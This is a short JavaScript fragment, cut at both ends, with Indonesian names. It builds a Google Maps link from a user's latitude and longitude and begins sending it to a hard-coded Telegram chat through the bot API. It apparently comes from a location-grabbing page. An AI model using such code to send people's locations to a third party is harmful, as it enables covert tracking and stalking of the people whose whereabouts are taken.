  const chat_id = "7032109008";

  function kirimLokasi(lat, lon) {
    let pesan = `📍 Lokasi User:
https://www.google.com/maps?q=${lat},${lon}`;

    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
